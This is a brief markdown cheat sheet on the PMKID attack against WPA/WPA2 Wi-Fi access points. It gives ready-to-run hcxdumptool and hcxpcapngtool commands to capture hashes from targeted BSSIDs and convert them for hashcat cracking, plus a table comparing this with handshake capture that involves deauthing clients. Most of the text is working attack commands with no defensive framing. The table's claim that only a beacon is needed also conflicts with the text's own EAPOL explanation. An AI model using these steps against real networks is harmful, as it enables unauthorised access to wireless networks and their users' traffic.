# PMKID Capture

PMKID (Pairwise Master Key Identifier) attack captures a hash from the first EAPOL frame without needing a connected client. Works on APs running hostapd.

## Capture with hcxdumptool
```bash
# Install
sudo apt install hcxdumptool hcxtools

# Capture PMKID from target APs
sudo hcxdumptool -i wlan0mon -o pmkid_capture.pcapng \
  --filterlist_ap=targets.txt --filtermode=2 \
  --enable_status=1

# targets.txt format (one BSSID per line):
AA:BB:CC:DD:EE:FF
11:22:33:44:55:66

# Convert to hashcat format (hc22000)
hcxpcapngtool -o pmkid_hash.hc22000 pmkid_capture.pcapng
```

## Verify PMKID Captured
```bash
# Check if PMKID was captured
# The first line of .hc22000 will start with "WPA*01*" if PMKID
cat pmkid_hash.hc22000 | grep "WPA\*01\*"
```

## PMKID vs Handshake
| Method | Client Needed? | Speed | Reliability |
|---|---|---|---|
| 4-way Handshake | Yes (need to deauth) | Slow (must wait for reconnect) | High |
| PMKID | No | Fast (just need beacon) | Lower (AP must support it) |
